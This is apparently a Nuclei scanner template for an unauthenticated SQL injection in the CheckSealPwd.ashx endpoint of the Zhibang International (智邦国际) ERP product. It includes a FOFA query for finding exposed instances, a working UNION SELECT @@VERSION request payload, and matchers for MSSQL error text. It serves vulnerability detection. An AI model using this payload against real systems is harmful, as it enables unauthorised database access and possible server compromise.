id: zhibangguojiERP-CheckSealPwd_ashx-sql

info:
  tags: zhibangguojiERP-CheckSealPwd_ashx-sql
  name: 智邦国际ERP CheckSealPwd.ashx SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="智邦国际-企业管理软件"
    智邦国际ERP CheckSealPwd.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        GET /SYSN/json/pcclient/CheckSealPwd.ashx?id=1+UNION+ALL+SELECT+@@VERSION-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '在将 nvarchar 值'
          - '转换成数据类型 int 时失败'
          - 'Microsoft SQL'
        condition: and
      - type: status
        status: 
          - 200
